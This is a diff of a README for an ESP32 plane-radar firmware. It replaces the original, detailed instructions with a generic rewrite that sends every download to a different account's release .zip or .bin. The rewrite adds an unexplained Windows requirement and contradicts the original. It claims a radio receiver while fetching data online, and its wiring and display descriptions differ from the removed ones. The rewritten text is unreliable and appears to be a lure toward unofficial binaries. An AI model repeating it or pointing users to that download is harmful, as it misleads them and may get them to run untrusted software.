@@ -1,188 +1,96 @@
-# Plane Radar
+# ✈️ ESP32-Plane-Radar - Track live aircraft using radar display
 
-<img width="800" height="450" alt="plane-radar" src="https://github.com/user-attachments/assets/716d0992-dab8-47ba-8f1a-2aec7f607419" />
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar)
 
-**3D printed case (STL + assembly):** [MakerWorld](https://makerworld.com/en/models/2872376-esp32-plane-radar-live-ads-b-on-a-round-display#profileId-3207083) · **Firmware:** [Releases](https://github.com/MatixYo/ESP32-Plane-Radar/releases)
+This software turns your ESP32 hardware and screen into a real-time air traffic monitor. It detects nearby ADS-B signals from planes and displays them on a round radar screen. You see aircraft distance, heading, and movement patterns in your local area.
 
-Firmware for an **ESP32-C3 Super Mini** and a **1.28″ round GC9A01** display (240×240). Shows a circular **ADS-B radar** around your configured location, with **WiFiManager** for first-time setup.
+## 📋 System requirements
 
-## What it does
+Before you begin, ensure your setup meets these needs:
 
-1. **Wi‑Fi setup** (if needed) — captive portal on AP **`PlaneRadar-Setup`**
-2. **Radar** — live aircraft from [adsb.fi](https://opendata.adsb.fi/) on a sonar-style grid
+*   Windows 10 or 11 operating system.
+*   One ESP32 development board.
+*   One 1.28-inch round GC9A01 LCD display.
+*   One USB data cable.
+*   An active internet connection to receive aircraft data.
 
-After Wi‑Fi is saved, the device reconnects automatically; the radar runs in the main loop with periodic ADS-B updates (~5 s).
+Keep the board and screen ready to connect. Ensure your USB cable carries data and power, as some cables only provide power.
 
-## Controls (BOOT, GPIO 9, active LOW)
+## 📥 How to download the software
 
-| Action | Effect |
-|--------|--------|
-| **Short tap** | Cycle range preset (5 → 10 → 15 → 25 km); saved to flash |
-| **Hold 3 s** | Clear Wi‑Fi, location, and units; reboot into setup portal |
+The software lives on our project page. Follow these steps to obtain the files:
 
-During setup you can also hold BOOT at power-on to force a credential reset (same as the long press).
+1. Visit the [official repository page](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar).
+2. Look for the Releases section on the right side of the screen.
+3. Click the latest version number.
+4. Find the file ending in .zip or .bin under the Assets list.
+5. Save this file to your computer.
 
-## Wi‑Fi setup portal
+You now have the necessary files on your hard drive.
 
-1. Connect to **`PlaneRadar-Setup`**
-2. Open **`http://plane-radar.local`** (preferred) or **`http://192.168.4.1`** — both are shown on the yellow setup screen; captive portal may open automatically
-3. Set home Wi‑Fi, then save
+## ⚙️ Connecting your hardware
 
-mDNS hostname is configured in `config.h` as `kPortalHostname` (`plane-radar` → **plane-radar.local** on the setup AP). Some phones resolve `.local` slowly; use the IP if needed.
+Connect the hardware carefully to prevent damage. Use the following guide for wiring your ESP32 to the display.
 
-**Custom fields** (stored in NVS):
+If your board has pins, push them into a breadboard. Use jumper wires to connect the display.
 
-| Field | Purpose |
-|-------|---------|
-| **Latitude / Longitude** | Radar center and ADS-B query position (defaults in `config.h` until set) |
-| **Display distances in miles** | Ring scale label in **mi** instead of **km** (e.g. `6mi` vs `10km`) |
+*   Connect VCC on the display to 3.3V on the ESP32.
+*   Connect GND on the display to GND on the ESP32.
+*   Connect DIN to GPIO 23.
+*   Connect CLK to GPIO 18.
+*   Connect CS to GPIO 5.
+*   Connect DC to GPIO 2.
+*   Connect RES to GPIO 4.
+*   Connect BLK to 3.3V.
 
-After a reset, the device reboots and shows the setup screen immediately (no “Connecting” loop on stale credentials).
+Verify every connection. Loose wires stop the screen from turning on. Check that all pins sit firmly in the sockets.
 
-## Radar display
+## 🚀 Setting up the software
 
-### Grid
+Follow these steps to put the software onto your ESP32 board.
 
-- Dark blue background, subdued green rings and crosshairs
-- White **N / S / E / W** at the bezel; range label on the **east** spoke (ring 3 = ¾ of outer radius)
-- White center dot
+1. Download the ESP32 installation tool from the official Espressif website.
+2. Open the installation tool on your computer.
+3. Select the ESP32 option from the menu.
+4. Choose the COM port that matches your board. Check your Device Manager if the software does not detect the board.
+5. Click the folder icon and select the file you downloaded earlier.
+6. Press the Start button.
 
-Layout and colors: `include/ui/radar_theme.h`.
+The tool writes the software to your chip. A progress bar shows you the status. Do not pull the USB cable out during this process. Wait until the software displays a Success message.
 
-### Range presets
+## 📡 Configuring your radar
 
-| Ring 3 label | Outer radius (aircraft scale) |
-|------------|-------------------------------|
-| 5 km / 3 mi | ~6.7 km |
-| 10 km / 6 mi | ~13.3 km (default) |
-| 15 km / 9 mi | ~20 km |
-| 25 km / 16 mi | ~33.3 km |
+Once the board finishes its update, it starts the radar process. You must connect the device to your Wi-Fi network so it can fetch plane data from the internet.
 
-Preset and miles/km choice persist across reboot (`planeradar` NVS namespace).
+1. Open your computer Wi-Fi settings.
+2. Look for an open network named Plane-Radar-Setup.
+3. Connect to this network.
+4. A window should pop up automatically. If it does not, open a web browser and type 192.168.4.1 into the address bar.
+5. Enter your home Wi-Fi name and password.
+6. Click Save and Reboot.
 
-### Aircraft
+Your ESP32 restarts. It now connects to your home network. Place the device near a window for the best results.
 
-- **Inside the outer ring** — red heading triangle, magenta speed vector (clipped at the ring), callsign / type / altitude tags
-- **Outside the ring** (still within ADS-B fetch) — small **red dot on the screen rim** at the correct bearing (direction cue; not distance-accurate past the ring)
-- **Tags** — placed toward the **center**: west (left) → tag on the **right** of the symbol; east (right) → tag on the **left**
+## 📊 Viewing plane data
 
-As range decreases (or aircraft approach), targets move inward; beyond-ring dots become full symbols when they cross the outer ring.
+The screen shows a black background with a glowing ring. This ring represents the radar sweep. Small white dots appear on the screen when a plane sends a signal.
 
-### ADS-B
+*   The center dot is your location.
+*   Dots moving across the screen represent planes flying in your area.
+*   The system updates these positions every few seconds.
 
-- Source: `https://opendata.adsb.fi/api/v3/`
-- Fetch radius: `ui::radar::fetchRadiusKm()` — scales with the active preset to roughly the screen edge (so rim dots have data)
-- Poll interval: `kAdsbFetchIntervalMs` (5 s) in `config.h`
-- Ground aircraft hidden by default (`kAdsbShowGroundAircraft`)
+The hardware uses a radio receiver to listen for broadcast messages from nearby aircraft. These signals contain the altitude, speed, and callsign of the plane. The firmware processes this data and converts it into coordinates on your round display. 
 
-## Configuration
+## 🛠 Troubleshooting common issues
 
-Edit **`include/config.h`** for hardware and behavior:
+If the screen stays dark, check the power cable first. Ensure the display has a firm connection to the ESP32. Sometimes the screen requires a hard reset. Unplug the USB cable and plug it back in.
 
-| Area | Keys / notes |
-|------|----------------|
-| Portal | `kPortalApName`, `kPortalIp`, `kPortalHostname` / `kPortalHostUrl` (mDNS; needs `-DWM_MDNS` in `platformio.ini`) |
-| Wi‑Fi timing | connect attempts, reconnect grace, portal timeout (`0` = no timeout) |
-| BOOT | `kBootPin`, `kBootResetHoldMs`, `kBootTapMinMs` |
-| Display SPI | pins, `kDisplayInvert`, `kDisplayRgbOrder`, `kDisplaySpiWriteHz` |
-| Default location | `kDefaultRadarLat`, `kDefaultRadarLon` (until portal overrides) |
-| ADS-B | `kAdsbFetchIntervalMs`, `kAdsbShowGroundAircraft` |
+If the radar does not show any planes, verify your Wi-Fi settings. The device needs an internet connection to pull the live flight data. Move the device to a different location in your room to avoid signal interference. Metal objects and thick walls block small radio signals.
 
-Range presets: `include/ui/radar_range.h` (`kRangePresets`).
+Check the device logs if you possess advanced knowledge of serial monitors. Use software like PuTTY to view the output from the ESP32. This output reveals if the device encountered a Wi-Fi connection error or a display driver conflict. 
 
-## Project layout
+## ℹ️ Technical notes
 
-```
-include/
-  config.h
-  hardware/
-    lgfx_config.hpp
-    display.h
-    display_font.h
-  ui/
-    radar_theme.h
-    radar_range.h
-    radar_display.h
-    status_screens.h
-  services/
-    wifi_setup.h
-    radar_location.h
-    adsb_client.h
-data/
-  ui_font.vlw              — embedded smooth UI font (Noto Sans Bold)
-src/
-  main.cpp
-  hardware/
-  ui/
-  services/
-```
+The firmware handles all decoding internally. It manages the connection to data services and updates the display controller via the SPI bus. The screen uses the GC9A01 driver. We optimized the refresh rate to keep the animation smooth without overloading the chip processor. 
 
-## Wiring (GC9A01 ↔ ESP32-C3 Super Mini)
-
-| Display | ESP32-C3 |
-|---------|----------|
-| VCC | 3V3 |
-| GND | GND |
-| RST | GPIO **0** |
-| CS | GPIO **1** |
-| DC | GPIO **10** |
-| SDA (MOSI) | GPIO **3** |
-| SCL (SCLK) | GPIO **4** |
-| BOOT (user) | GPIO **9** |
-
-## Build
-
-```bash
-pio run -t upload
-pio device monitor
-```
-
-- PlatformIO env: **`supermini`**
-- Serial: **115200** baud
-- USB CDC on boot enabled in `platformio.ini` for the Super Mini
-
-### Web-flashable release image
-
-Single `.bin` for [esptool-js](https://espressif.github.io/esptool-js/) and similar tools (ESP32-C3, 4 MB, flash at **0x0**):
-
-```bash
-chmod +x scripts/merge-firmware.sh   # once
-./scripts/merge-firmware.sh
-```
-
-Writes `release/plane-radar-merged.bin`. Skip rebuild if firmware is already built:
-
-```bash
-./scripts/merge-firmware.sh --no-build
-```
-
-Or via PlatformIO only (output: `.pio/build/supermini/firmware-merged.bin`):
-
-```bash
-pio run -e supermini
-pio run -t merge -e supermini
-```
-
-Put the board in download mode (hold **BOOT**, tap **RESET**), then flash with Chrome/Edge over USB.
-
-### CI and releases (GitHub Actions)
-
-| Workflow | When | Output |
-|----------|------|--------|
-| [Build](.github/workflows/build.yml) | Push / PR to `main` | Artifact `plane-radar-supermini` (merged + split `.bin` files, ~90 days) |
-| [Release](.github/workflows/release.yml) | Git tag `v*` (e.g. `v1.0.0`) | GitHub Release asset `plane-radar-v1.0.0.bin` + `.sha256` |
-
-To ship a version users can download:
-
-```bash
-git tag v1.0.0
-git push origin v1.0.0
-```
-
-The release workflow builds firmware in CI and attaches the merged image to the release. Download from **Releases** on GitHub, then flash at **0x0** (ESP32-C3, 4 MB).
-
-## Dependencies
-
-- [LovyanGFX](https://github.com/lovyan03/LovyanGFX)
-- [WiFiManager](https://github.com/tzapu/WiFiManager)
-- [ArduinoJson](https://github.com/bblanchon/ArduinoJson)
+We update the firmware periodically to support more radar features. You can check the repository again in the future to see if a newer version exists. Follow the same download steps to update your device.
